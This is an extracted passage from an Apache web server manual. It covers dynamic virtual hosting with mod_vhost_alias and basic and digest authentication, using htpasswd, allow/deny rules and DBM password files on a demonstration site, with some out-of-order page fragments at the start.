 
 

 
 
Copyright 
    
 
Preface 
       
 
Who Wrote Apache, and Why? 
       
 
The Demonstration Code 
       
 
Conventions Used in This Book  
       
 
Organization of This Book 
       
 
Acknowledgments 
    
    
 
Chapter 1.  Getting Started 
customer. ErrorLog tells Apache where to log its errors, and TransferLog its successes. 
As we will see in Chapter 10 , the information stored in these logs can be tuned.  
ServerType 
  
 
ServerType [inetd|standalone] 
Default: standalone 
Server config 
Abolished in Apache v2 
  
The ServerType directive allows you to control the way in which Apache handles 
multiple copies of itself. The arguments are inetd or standalone (the default):  
inetd  
You might not want Apache to spawn a cloud of waiting child processes at all, but 
rather to start up a new one each time a request comes in and exit once it has been 
dealt with. This is slower, but it consumes fewer resources when there are no 
clients to be dealt with. However, this method is deprecated by the Apache Group 
as being clumsy and inefficient. On some platforms it may not work at all, and the 
Group has no plans to fix it. The utility inetd is configured in /etc/inetd.conf (see 
man inetd ). The entry for Apache would look something like this:  
http stream tcp nowait root /usr/local/bin/httpd httpd -d 
directory 
standalone  
The default; this allows the swarm of waiting child servers.  
Having set up the customers, we can duplicate the block, making some slight changes to 
suit the salespeople. The two servers have different DocumentRoots, which is to be 

expected because that's why we set up two hosts in the first place. They also have 
different error and transfer logs, but they don't have to. You could have one transfer log 
and one error log, or you could write all the logging for both sites to a single file.  
Type go on the server (this may require root privileges); while on the client, as before, 
access http://www.butterthlies.com or http://sales.butterthlies.com /.  
The files in ... /sales/htdocs are similar to those on ... /customers/htdocs, but altered 
enough so that we can see the difference when we access the two sites. index.html has 
been edited so that the first line reads:  
<h1>SALESMEN Index to Butterthlies Catalogs</h1> 
The file catalog_summer.html has been edited so that it reads:  
<h1>Welcome to the great rip-off of '97: Butterthlies Inc</h1> 
<p>All our worthless cards are available in packs of 20 at $1.95 a 
pack. WHAT A  
FANTASTIC DISCOUNT! There is an amazing FURTHER 10% discount if you 
order more  
than 100. </p> ... 
and so on, until the joke gets boring. Now we can throw the great machine into operation. 
From console 1, get into ... /customers and type:  
% ./go 
The first Apache is running. Now get into .../sales and again type:  
% ./go 
Now, as the client, you log on to http://www.butterthlies.com / and see the customers' 
site, which shows you the customers' catalogs. Quit, and metamorphose into a voracious 
salesperson by logging on to http://sales.butterthlies.com /. You are given a nasty insight 
into the ugly reality beneath the smiling face of e-commerce!  
4.4 Dynamically Configured Virtual Hosting 
An even neater method of managing Virtual Hosting is provided by mod_vhost_alias, 
which lets you define a single boilerplate configuration and then fills in the details at 
service time from the IP address and or the Host header in the HTTP request.  
All the directives in this module interpolate a string into a pathname. The interpolated 
string (called the "name") may be either the server name (see the UseCanonicalName 
directive for details on how this is determined) or the IP address of the virtual host on the 
server in dotted-quad format (xxx.xxx.xxx.xxx).  

The interpolation is controlled by a mantra, %<code-letter>, which is replaced by some 
value you supply in the Config file. It's not unlike the controls for logging — see Chapter 
10.  
These are the possible formats: 
%%  
Insert a literal %.  
%p  
Insert the port number of the virtual host.  
%N.M  
Insert (part of ) the name. N and M are numbers, used to specify substrings of the 
name. N selects from the dot-separated components of the name, and M selects 
characters within whatever N has selected. M is optional and defaults to zero if it 
isn't present. The dot must be present if and only if M is present. If we are trying to 
parse sales.butterthlies.com, the interpretation of N is as follows:  
0  
The whole name: sales.butterthlies.com  
1  
The first part: sales  
2  
The second part: butterthlies  
-1  
The last part: com  
-2  
The penultimate part: butterthlies  
2+  
The second and all subsequent parts: butterthlies.com  

-2+  
The penultimate and all preceding parts: www.butterthlies  
1+ and -1+  
The same as 0: sales.butterthlies.com  
If N or M is greater than the number of parts available, a single underscore is 
interpolated.  
4.4.1 Examples 
For simple name-based virtual hosts, you might use the following directives in your 
server-configuration file:  
UseCanonicalName Off 
VirtualDocumentRoot /usr/local/apache/vhosts/%0 
A request for http://www.example.com/directory/file.html will be satisfied by the file 
/usr/local/apache/vhosts/www.example.com/directory/file.html.  
On .../site.dynamic we have implemented a version of the familiar Buttterthlies site, with 
a password-protected salesperson's department. The first Config file, .../conf/httpd1.conf, 
is as follows:  
User webuser 
Group webgroup 
 
ServerName my586 
 
UseCanonicalName Off 
VirtualDocumentRoot /usr/www/APACHE3/site.dynamic/htdocs/%0  
<Directory /usr/www/APACHE3/site.dynamic/htdocs/sales.butterthlies.com> 
AuthType Basic 
AuthName Darkness 
AuthUserFile /usr/www/APACHE3/ok_users/sales 
AuthGroupFile /usr/www/APACHE3/ok_users/groups 
Require group cleaners 
</Directory> 
Launch it with go 1; it responds nicely to http://www.butterthlies.com and 
http://sales.butterthlies.com.  
There is an equivalent VirtualScriptAlias directive, but it insists on URLs containing 
../cgi-bin/... — for instance, www.butterthlies.com/cgi-bin/mycgi. In view of the reputed 
horror some search engines have for "cgi-bin", you might prefer not to use it and to keep 
"cgi-bin" out of your URLs with this:  

ScriptAliasMatch /(.*) /usr/www/APACHE3/cgi-bin/handler/$1 
The effect should be that any visitor to <http://yourURL>/fredwill call the script .../cgi-
bin/handler and pass "fred" to it in the PATH_INFO Environment variable.  
If you have a very large number of virtual hosts, it's a good idea to arrange the files to 
reduce the size of the vhosts directory. To do this, you might use the following in your 
configuration file:  
UseCanonicalName Off 
VirtualDocumentRoot /usr/local/apache/vhosts/%3+/%2.1/%2.2/%2.3/%2 
A request for http://www.example.isp.com/directory/file.html will be satisfied by the file 
/usr/local/apache/vhosts/isp.com/e/x/a/example/directory/file.html (because isp.com 
matches to %3+, e matches to %2.1 — the first character of the second part of the URL 
example, and so on). The point is that most OSes are very slow if you have thousands of 
subdirectories in a single directory: this scheme spreads them out.  
A more even spread of files can often be achieved by selecting from the end of the name, 
for example:  
VirtualDocumentRoot /usr/local/apache/vhosts/%3+/%2.-1/%2.-2/%2.-3/%2 
The example request would come from 
/usr/local/apache/vhosts/isp.com/e/l/p/example/directory/file.html. Alternatively, you 
might use:  
VirtualDocumentRoot /usr/local/apache/vhosts/%3+/%2.1/%2.2/%2.3/%2.4+ 
The example request would come from 
/usr/local/apache/vhosts/isp.com/e/x/a/mple/directory/file.html.  
For IP-based virtual hosting you might use the following in your configuration file:  
UseCanonicalName DNS 
VirtualDocumentRootIP /usr/local/apache/vhosts/%1/%2/%3/%4/docs 
VirtualScriptAliasIP /usr/local/apache/vhosts/%1/%2/%3/%4/cgi-bin 
A request for http://www.example.isp.com/directory/file.html would be satisfied by the 
file /usr/local/apache/vhosts/10/20/30/40/docs/directory/file.html if the IP address of 
www.example.com were 10.20.30.40. A request for http://www.example.isp.com/cgi-
bin/script.pl would be satisfied by executing the program 
/usr/local/apache/vhosts/10/20/30/40/cgi-bin/script.pl.  
If you want to include the . character in a VirtualDocumentRoot directive, but it clashes 
with a % directive, you can work around the problem in the following way:  
VirtualDocumentRoot /usr/local/apache/vhosts/%2.0.%3.0 

A request for http://www.example.isp.com/directory/file.html will be satisfied by the file 
/usr/local/apache/vhosts/example.isp/directory/file.html.  
The LogFormat directives %V and %A are useful in conjunction with this module. See 
Chapter 10.  
VirtualDocumentRoot 
  
 
VirtualDocumentRoot interpolated-directory 
Default: None 
Server config, virtual host 
Compatibility: VirtualDocumentRoot is only available in 
1.3.7 and later. 
  
The VirtualDocumentRoot directive allows you to determine where Apache will find 
your documents based on the value of the server name. The result of expanding 
interpolated-directory is used as the root of the document tree in a similar manner to 
the DocumentRoot directive's argument. If interpolated-directory is none, then 
VirtualDocumentRoot is turned off. This directive cannot be used in the same context as 
VirtualDocumentRootIP.  
VirtualDocumentRootIP 
  
 
VirtualDocumentRootIP interpolated-directory 
Default: None 
Server config, virtual host 
  
The VirtualDocumentRootIP directive is like the VirtualDocumentRoot directive, 
except that it uses the IP address of the server end of the connection instead of the server 
name.  
VirtualScriptAlias 
  
 
VirtualScriptAlias interpolated-directory 
Default: None 
Server config, virtual host 
  
The VirtualScriptAlias directive allows you to determine where Apache will find 
CGI scripts in a manner similar to how VirtualDocumentRoot does for other documents. 
It matches requests for URIs starting /cgi-bin/, much like the following:  
ScriptAlias /cgi-bin/ ... 
VirtualScriptAliasIP 
  

 
VirtualScriptAliasIP interpolated-directoryDefault: 
NoneServer config, virtual host 
  
The VirtualScriptAliasIP directive is like the VirtualScriptAlias directive, except 
that it uses the IP address of the server end of the connection instead of the server name.  

 
 
CONTENTS 
Chapter 5. Authentication 
• 
 5.1 Authentication Protocol  
• 
 5.2 Authentication Directives  
• 
 5.3 Passwords Under Unix  
• 
 5.4 Passwords Under Win32  
• 
 5.5 Passwords over the Web  
• 
 5.6 From the Client's Point of View  
• 
 5.7 CGI Scripts  
• 
 5.8 Variations on a Theme  
• 
 5.9 Order, Allow, and Deny  
• 
 5.10 DBM Files on Unix  
• 
 5.11 Digest Authentication  
• 
 5.12 Anonymous Access  
• 
 5.13 Experiments  
• 
 5.14 Automatic User Information  
• 
 5.15 Using .htaccess Files  
• 
 5.16 Overrides  
The volume of business Butterthlies, Inc. is doing is stupendous, and naturally our 
competitors are anxious to look at sensitive information such as the discounts we give our 
salespeople. We have to seal our site off from their vulgar gaze by authenticating those 
who log on to it.  
5.1 Authentication Protocol 
Authentication is simple in principle. The client sends his name and password to Apache. 
Apache looks up its file of names and encrypted passwords to see whether the client is 
entitled to access. The webmaster can store a number of clients in a list — either as a 
simple text file or as a database — and thereby control access person by person.  
It is also possible to group a number of people into named groups and to give or deny 
access to these groups as a whole. So, throughout this chapter, bill and ben are in the 
group directors, and daphne and sonia are in the group cleaners. The webmaster can 
require user so and so or require group such and such, or even simply require that 
visitors be registered users. If you have to deal with large numbers of people, it is 
obviously easier to group them in this way. To make the demonstration simpler, the 
password is always theft. Naturally, you would not use so short and obvious a password 
in real life, or one so open to a dictionary attack.  
Each username/password pair is valid for a particular realm, which is named when the 
passwords are created. The browser asks for a URL; the server sends back 

"Authentication Required" (code 401) and the realm. If the browser already has a 
username/password for that realm, it sends the request again with the 
username/password. If not, it prompts the user, usually including the realm's name in the 
prompt, and sends that.  
Of course, all this is worryingly insecure since the password is sent unencrypted over the 
Web (base64 encoding is easily reversed), and any malign observer simply has to watch 
the traffic to get the password — which is as good in his hands as in the legitimate 
client's. Digest authentication improves on this by using a challenge/handshake protocol 
to avoid revealing the actual password. In the two earlier editions of this book, we had to 
report that no browsers actually supported this technique; now things are a bit better. 
Using SSL (see Chapter 11) also improves this.  
5.1.1 site.authent 
Examples are found in site.authent. The first Config file, .../conf/httpd1.conf, looks like 
this:  
User webuser 
Group webgroup 
ServerName www.butterthlies.com 
NameVirtualHost 192.168.123.2 
 
<VirtualHost www.butterthlies.com> 
ServerAdmin sales@butterthlies.com 
DocumentRoot /usr/www/APACHE3/site.authent/htdocs/customers 
ServerName www.butterthlies.com 
ErrorLog /usr/www/APACHE3/site.authent/logs/error_log 
TransferLog /usr/www/APACHE3/site.authent/logs/customers/access_log 
ScriptAlias /cgi-bin /usr/www/APACHE3/cgi-bin 
</VirtualHost> 
 
<VirtualHost sales.butterthlies.com> 
ServerAdmin sales_mgr@butterthlies.com 
DocumentRoot /usr/www/APACHE3/site.authent/htdocs/salesmen 
ServerName sales.butterthlies.com 
ErrorLog /usr/www/APACHE3/site.authent/logs/error_log 
TransferLog /usr/www/APACHE3/site.authent/logs/salesmen/access_log 
ScriptAlias /cgi-bin /usr/www/APACHE3/cgi-bin 
 
<Directory /usr/www/APACHE3/site.authent/htdocs/salesmen> 
AuthType Basic 
AuthName darkness 
AuthUserFile /usr/www/APACHE3/ok_users/sales 
AuthGroupFile /usr/www/APACHE3/ok_users/groups 
require valid-user 
</Directory> 
 
</VirtualHost> 
What's going on here? The key directive is AuthType Basic in the <Directory 
...salesmen> block. This turns Authentication checking on.  

5.2 Authentication Directives 
From Apache v1.3 on, filenames are relative to theserver rootunless they are absolute. A 
filename is taken as absolute if it starts with / or, on Win32, if it starts with drive :/. It 
seems sensible for us to write them in absolute form to prevent misunderstandings. The 
directives are as follows:  
AuthType 
  
 
AuthType type 
directory, .htaccess 
  
AuthType specifies the type of authorization control. Basic was originally the only 
possible type, but Apache 1.1 introduced Digest, which uses an MD5 digest and a shared 
secret.  
If the directive AuthType is used, we must also use AuthName, AuthGroupFile, and 
AuthUserFile.  
AuthName 
  
 
AuthName auth-realm 
directory, .htaccess 
  
AuthName gives the name of the realm in which the users' names and passwords are valid. 
If the name of the realm includes spaces, you will need to surround it with quotation 
marks:  
AuthName "sales people" 
AuthGroupFile 
  
 
AuthGroupFile filename 
directory, .htaccess 
  
AuthGroupFile has nothing to do with the Group webgroup directive at the top of the 
Config file. It gives the name of another file that contains group names and their 
members:  
cleaners: daphne sonia 
directors: bill ben 
We put this into ... /ok_users/groups and set AuthGroupFile to match. The 
AuthGroupFile directive has no effect unless the require directive is suitably set.  

AuthUserFile 
  
 
AuthUserFile filename 
  
AuthUserFile is a file of usernames and their encrypted passwords. There is quite a lot 
to this; see the section Section 5.3, Section 5.4, and Section 5.5 later in this chapter.  
AuthAuthoritative 
  
 
AuthAuthoritative on|off 
Default: AuthAuthoritative on 
directory, .htaccess 
  
Setting the AuthAuthoritative directive explicitly to off allows for both authentication 
and authorization to be passed on to lower-level modules (as defined in the Config and 
modules.c files) if there is no user ID or rule matching the supplied user ID. If there is a 
user ID and/or rule specified, the usual password and access checks will be applied, and a 
failure will give an Authorization Required reply.  
So if a user ID appears in the database of more than one module or if a valid Require 
directive applies to more than one module, then the first module will verify the 
credentials, and no access is passed on — regardless of the AuthAuthoritative setting.  
A common use for this is in conjunction with one of the database modules, such as 
mod_auth_db.c, mod_auth_dbm.c, mod_auth_msql.c, and mod_auth_anon.c. These 
modules supply the bulk of the user-credential checking, but a few (administrator) related 
accesses fall through to a lower level with a well-protected AuthUserFile.  
Default 
By default, control is not passed on, and an unknown user ID or rule will result in an 
Authorization Required reply. Not setting it thus keeps the system secure.  
Security 
Do consider the implications of allowing a user to allow fall-through in her .htaccess file, 
and verify that this is really what you want. Generally, it is easier just to secure a single 
.htpasswd file than it is to secure a database such as mSQL. Make sure that the 
AuthUserFile is stored outside the document tree of the web server; do not put it in the 
directory that it protects. Otherwise, clients will be able to download the AuthUserFile.  
AuthDBAuthoritative 
  
 

AuthDBAuthoritative on|off 
Default: AuthDBAuthoritative on 
directory, .htaccess 
  
Setting the AuthDBAuthoritative directive explicitly to off allows for both 
authentication and authorization to be passed on to lower-level modules (as defined in the 
Config and modules.c files) if there is no user ID or rule matching the supplied user ID. If 
there is a user ID and/or rule specified, the usual password and access checks will be 
applied, and a failure will give an Authorization Required reply.  
So if a user ID appears in the database of more than one module or if a valid Require 
directive applies to more than one module, then the first module will verify the 
credentials, and no access is passed on — regardless of the AuthAuthoritative setting.  
A common use for this is in conjunction with one of the basic auth modules, such as 
mod_auth.c. Whereas this DB module supplies the bulk of the user-credential checking, a 
few (administrator) related accesses fall through to a lower level with a well-protected 
.htpasswd file.  
Default 
By default, control is not passed on, and an unknown user ID or rule will result in an 
Authorization Required reply. Not setting it thus keeps the system secure.  
Security 
Do consider the implications of allowing a user to allow fall-through in his .htaccess file, 
and verify that this is really what you want. Generally, it is easier just to secure a single 
.htpasswd file than it is to secure a database that might have more access interfaces.  
AuthDBMAuthoritative 
  
 
AuthDBMAuthoritative on|off 
Default: AuthDBMAuthoritative on 
directory, .htaccess 
  
Setting the AuthDBMAuthoritative directive explicitly to off allows for both 
authentication and authorization to be passed on to lower-level modules (as defined in the 
Config and modules.c files) if there is no user ID or rule matching the supplied user ID. If 
there is a user ID and/or rule specified, the usual password and access checks will be 
applied, and a failure will give an Authorization Required reply.  
So if a user ID appears in the database of more than one module or if a valid Require 
directive applies to more than one module, then the first module will verify the 
credentials, and no access is passed on — regardless of the AuthAuthoritative setting.  

A common use for this is in conjunction with one of the basic auth modules, such as 
mod_auth.c. Whereas this DBM module supplies the bulk of the user-credential 
checking, a few (administrator) related accesses fall through to a lower level with a well-
protected .htpasswd file.  
Default 
By default, control is not passed on, and an unknown user ID or rule will result in an 
Authorization Required reply. Not setting it thus keeps the system secure.  
Security 
Do consider the implications of allowing a user to allow fall-through in her .htaccess file, 
and verify that this is really what you want. Generally, it is easier to just secure a single 
.htpasswd file than it is to secure a database that might have more access interfaces.  
require 
  
 
require [user user1 user2 ...] [group group1 group2] [valid-
user] 
 
[valid-user] [valid-group] 
directory, .htaccess 
  
The key directive that throws password checking into action is require.  
The argument, valid-user, accepts any users that are found in the password file. Do not 
mistype this as valid_user, or you will get a hard-to-explain authorization failure when 
you try to access this site through a browser. This is because Apache does not care what 
you put after require and will interpret valid_user as a username. It would be nice if 
Apache returned an error message, but require is usable by multiple modules, and 
there's no way to determine (in the current API) what values are valid.  
file-owner  
[Available after Apache 1.3.20] The supplied username and password must be in the 
AuthUserFile database, and the username must also match the system's name for the 
owner of the file being requested. That is, if the operating system says the requested file 
is owned by jones, then the username used to access it through the Web must be jones as 
well.  
file-group  
[Available after Apache 1.3.20] The supplied username and password must be in the 
AuthUserFile database, the name of the group that owns the file must be in the 
AuthGroupFile database, and the username must be a member of that group. For 

example, if the operating system says the requested file is owned by group accounts, the 
group accounts must be in the AuthGroupFile database, and the username used in the 
request must be a member of that group.  
We could say: 
require user bill ben simon 
to allow only those users, provided they also have valid entries in the password table, or 
we could say:  
require group cleaners 
in which case only sonia and daphne can access the site, provided they also have valid 
passwords and we have set up AuthGroupFile appropriately.  
The block that protects ... /cgi-bin could safely be left out in the open as a separate block, 
but since protection of the ... /salesmen directory only arises when sales.butterthlies.com 
is accessed, we might as well put the require directive there.  
satisfy 
  
 
satisfy [any|all] 
Default: all 
directory, .htaccess 
  
satisfy sets access policy if both allow and require are used. The parameter can be 
either all or any. This directive is only useful if access to a particular area is being 
restricted by both username/password and client host address. In this case, the default 
behavior (all) is to require the client to pass the address access restriction and enter a 
valid username and password. With the any option, the client will be granted access if he 
either passes the host restriction or enters a valid username and password. This can be 
used to let clients from particular addresses into a password-restricted area without 
prompting for a password.  
For instance, we want a password from everyone except site 1.2.3.4: 
<usual auth setup (realm, files etc> 
require valid-user 
Satisfy any 
order deny,allow 
allow from 1.2.3.4 
deny from all 
5.3 Passwords Under Unix 

Authentication of salespeople is managed by the password file sales, stored in 
/usr/www/APACHE3/ok_users. This is safely above the document root, so that the Bad 
Guys cannot get at it to mess with it. The file sales is maintained using the Apache utility 
htpasswd. The source code for this utility is to be found in ... 
/apache_1.3.1/src/support/htpasswd.c, and we have to compile it with this:  
% make htpasswd 
htpasswd now links, and we can set it to work. Since we don't know how it functions, the 
obvious thing is to prod it with this:  
% htpasswd -? 
It responds that the correct usage is as follows: 
Usage: 
 
htpasswd [-cmdps] passwordfile username 
 
htpasswd -b[cmdps] passwordfile username password 
 
 -c  Create a new file. 
 -m  Force MD5 encryption of the password. 
 -d  Force CRYPT encryption of the password (default). 
 -p  Do not encrypt the password (plaintext). 
 -s  Force SHA encryption of the password. 
 -b  Use the password from the command line rather than prompting for 
it. 
On Windows and TPF systems the '-m' flag is used by default. 
On all other systems, the '-p' flag will probably not work. 
This seems perfectly reasonable behavior, so let's create a user bill with the password 
"theft" (in real life, you would never use so obvious a password for a character such as 
Bill of the notorious Butterthlies sales team, because it would be subject to a dictionary 
attack, but this is not real life):  
% htpasswd -m -c ... /ok_users/sales bill 
We are asked to type his password twice, and the job is done. If we look in the password 
file, there is something like the following:  
bill:$1$Pd$E5BY74CgGStbs.L/fsoEU0 
Add subsequent users (the -c flag creates a new file, so we shouldn't use it after the first 
one):  
% htpasswd ... /ok_users/sales ben 
There is no warning if you use the -c flag by accident, so be cautious. Carry on and do 
the same for sonia and daphne. We gave them all the same password, "theft," to save 
having to remember different ones later — another dangerous security practice.  

The password file ... /ok_users/users now looks something like this:[1]  
bill:$1$Pd$E5BY74CgGStbs.L/fsoEU0 
ben:$1$/S$hCyzbA05Fu4CAlFK4SxIs0 
sonia:$1$KZ$ye9u..7GbCCyrK8eFGU2w. 
daphne:$1$3U$CF3Bcec4HzxFWppln6Ai01 
Each username is followed by an encrypted password. They are stored like this to protect 
the passwords because, at least in theory, you cannot work backward from the encrypted 
to the plain-text version. If you pretend to be Bill and log in using:  
$1$Pd$E5BY74CgGStbs.L/fsoEU0 
the password gets re-encrypted, becomes something like o09klks23O9RM, and fails to 
match. You can't tell by looking at this file (or if you can, we'll all be very disappointed) 
that Bill's password is actually "theft."  
From Apache v1.3.14, htpasswd will also generate a password to standard output by 
using the flag -n.  
5.4 Passwords Under Win32 
Since Win32 lacks an encryption function, passwords are stored in plain text. This is not 
very secure, but one hopes it will change for the better. The passwords would be stored in 
the file named by the AuthUserFile directive, and Bill's entry would be:  
bill:theft 
except that in real life you would use a better password. 
5.5 Passwords over the Web 
The security of these passwords on your machine becomes somewhat irrelevant when we 
realize that they are transmitted unencrypted over the Web. The Base64 encoding used 
for Basic password transmission keeps passwords from being readable at a glance, but it 
is very easily decoded. Authentication, as described here, should only be used for the 
most trivial security tasks. If a compromised password could cause any serious trouble, 
then it is essential to encrypt it using SSL — see Chapter 11.  
5.6 From the Client's Point of View 
If you run Apache using httpd1.conf, you will find you can access 
www.butterthlies.comas before. But if you go to sales.butterthlies.com,you will have to 
give a username and password.  
5.6.1 The Config File 

The file is httpd2.conf. These are the relevant bits:  
... 
AuthType Digest  
AuthName darkness 
AuthDigestDomain  http://sales.butterthlies.com 
AuthDigestFile /usr/www/APACHE3/ok_digest/digest_users 
Run it with ./go 2. At the client end, Microsoft Internet Explorer (MSIE) v5 displayed a 
password screen decorated with a key and worked as you would expect; Netscape v4.05 
asked for a username and password in the usual way and returned error 401 
"Authorization required."  
5.7 CGI Scripts 
Authentication (both Basic and Digest) can also protect CGI scripts. Simply provide a 
suitable <Directory .../cgi-bin> block.  
5.8 Variations on a Theme 
You may find that logging in again is a bit more elaborate than you would think. We 
found that both MSIE and Netscape were annoyingly helpful in remembering the 
password used for the last login and using it again. To make sure you are really 
exercising the security features, you have to exit your browser completely each time and 
reload it to get a fresh crack.  
You might like to try the effect of inserting these lines in either of the previous Config 
files:  
.... 
#require valid-user  
#require user daphne bill  
#require group cleaners  
#require group directors 
... 
and uncommenting them one line at a time (remember to kill and restart Apache each 
time).  
5.9 Order, Allow, and Deny 
So far we have dealt with potential users on an individual basis. We can also allow access 
from or deny access to specific IP addresses, hostnames, or groups of addresses and 
hostnames. The commands are allow from and deny from.  
The order in which the allow and deny commands are applied is not set by the order in 
which they appear in your file. The default order is deny then allow : if a client is 

excluded by deny, it is excluded unless it matches allow. If neither is matched, the client 
is granted access.  
The order in which these commands is applied can be set by the order directive.  
allow from 
  
 
allow from host host ... 
directory, .htaccess 
  
The allow directive controls access to a directory. The argument host can be one of the 
following:  
all  
All hosts are allowed access.  
A (partial) domain name  
All hosts whose names match or end in this string are allowed access.  
A full IP address  
The first one to three bytes of an IP address are allowed access, for subnet 
restriction.  
A network/netmask pair  
Network a.b.c.d and netmask w.x.y.z are allowed access, to give finer-grained 
subnet control. For instance, 10.1.0.0/255.255.0.0.  
A network CIDR specification  
The netmask consists of nnn high-order 1-bits. For instance, 10.1.0.0/16 is the 
same as 10.1.0.0/255.255.0.0.  
allow from env 
  
 
allow from env=variablename ... 
directory, .htaccess 
  
The allow from env directive controls access by the existence of a named environment 
variable. For instance:  

BrowserMatch ^KnockKnock/2.0 let_me_in 
<Directory /docroot> 
order deny,allow 
deny from all 
allow from env=let_me_in 
</Directory> 
Access by a browser called KnockKnock v2.0 sets an environment variable 
let_me_in,which in turn triggersallow from.  
deny from 
  
 
deny from host host ... 
directory, .htaccess 
  
The deny from directive controls access by host. The argument host can be one of the 
following:  
all  
All hosts are denied access.  
A (partial) domain name  
All hosts whose names match or end in this string are denied access.  
A full IP address  
The first one to three bytes of an IP address are denied access, for subnet 
restriction.  
A network/netmask pair  
Network a.b.c.d and netmask w.x.y.z are denied access, to give finer-grained 
subnet control. For instance, 10.1.0.0/255.255.0.0.  
A network CIDR specification  
The netmask consists of nnn high-order 1-bits. For instance, 10.1.0.0/16 is the 
same as 10.1.0.0/255.255.0.0.  
deny from env 
  
 
deny from env=variablename ... 
directory, .htaccess 
  

The deny from env directive controls access by the existence of a named environment 
variable. For instance:  
BrowserMatch ^BadRobot/0.9 go_away 
<Directory /docroot> 
order allow,deny 
allow from all 
deny from env=go_away 
</Directory> 
Access by a browser called BadRobot v0.9 sets an environment variable go_away, which 
in turn triggers deny from.  
Order 
  
 
order ordering 
directory, .htaccess 
  
The ordering argument is one word (i.e., it is not allowed to contain a space) and 
controls the order in which the foregoing directives are applied. If two order directives 
apply to the same host, the last one to be evaluated prevails:  
deny,allow  
The deny directives are evaluated before the allow directives. This is the default.  
allow,deny  
The allow directives are evaluated before the denys, but the user will still be 
rejected if a deny is encountered.  
mutual-failure  
Hosts that appear on the allow list and do not appear on the deny list are allowed 
access.  
We could say: 
allow from all 
which lets everyone in and is hardly worth writing, or we could say: 
allow from 123.156 
deny from all 

As it stands, this denies everyone except those whose IP addresses happen to start with 
123.156. In other words, allow is applied last and carries the day. If, however, we 
changed the default order by saying:  
order allow,deny 
allow from 123.156 
deny from all 
we effectively close the site because deny is now applied last. It is also possible to use 
domain names, so that instead of:  
deny from 123.156.3.5 
you could say: 
deny from badguys.com  
Although this has the advantage of keeping up with the Bad Guys as they move from one 
IP address to another, it also allows access by people who control the reverse-DNS 
mapping for their IP addresses.  
A URL can be contain just part of the hostname. In this case, the match is done on whole 
words from the right. That is, allow from fred.com allows fred.com and abc.fred.com, 
but not notfred.com.  
Good intentions, however, are not enough: before conferring any trust in a set of access 
rules, you want to test them very thoroughly in private before exposing them to the 
world. Try the site with as many different browsers as you can muster: Netscape and 
MSIE can behave surprisingly differently. Having done that, try the site from a public-
access terminal — in a library, for instance.  
5.10 DBM Files on Unix 
Although searching a file of usernames and passwords works perfectly well, it is apt to be 
rather slow once the list gets up to a couple hundred entries. To deal with this, Apache 
provides a better way of handling large lists by turning them into a database. You need 
one (not both!) of the modules that appear in the Config file as follows:  
#Module db_auth_module  mod_auth_db.o  
Module dbm_auth_module mod_auth_dbm.o 
Bear in mind that they correspond to different directives: AuthDBMUserFile or 
AuthDBUserFile. A Perl script to manage both types of database, dbmmanage, is 
supplied with Apache in .../src/support. To decide which type to use, you need to 
discover the capabilities of your Unix. Explore these by going to the command prompt 
and typing first:  

% man db 
and then: 
% man dbm 
Whichever method produces a manpage is the one you should use. You can also use a 
SQL database, employing MySQLor a third-party package to manage it.  
Once you have decided which method to use, edit the Config file to include the 
appropriate module, and then type:  
% ./Configure 
and: 
% make 
We now have to create a database of our users: bill, ben, sonia, and daphne. Go to ... 
/apache/src/support, find the utility dbmmanage, and copy it into /usr/local/bin or 
something similar to put it on your path. This utility may be distributed without execute 
permission set, so, before attempting to run it, we may need to change the permissions:  
% chmod +x dbmmanage 
You may find, when you first try to run dbmmanage, that it complains rather puzzlingly 
that some unnamed file can't be found. Since dbmmanage is a Perl script, this is probably 
Perl, a text-handling language, and if you have not installed it, you should. It may also be 
necessary to change the first line of dbmmanage:  
#!/usr/bin/perl5 
to the correct path for Perl, if it is installed somewhere else. 
If you provoke it with dbmmanage -?, you get: 
Usage: dbmmanage [enc] dbname command [username [pw [group[,group] 
[comment]]]] 
 
    where enc is  -d for crypt encryption (default except on Win32, 
Netware) 
                  -m for MD5 encryption (default on Win32, Netware) 
                  -s for SHA1 encryption 
                  -p for plaintext 
 
    command is one of: add|adduser|check|delete|import|update|view 
 
    pw of . for update command retains the old password 
    pw of--(or blank) for update command prompts for the password 
 

    groups or comment of . (or blank) for update command retains old 
values 
    groups or comment of--for update command clears the existing value 
    groups or comment of--for add and adduser commands is the empty 
value 
 
takes the following arguments: 
dbmmanage [enc] dbname command [username [pw [group[,group] 
[comment]]]] 
 
'enc' sets the encryption method: 
-d for crypt (default except Win32, Netware) 
-m for MD5 (default on Win32, Netware) 
-s for SHA1  
-p for plaintext 
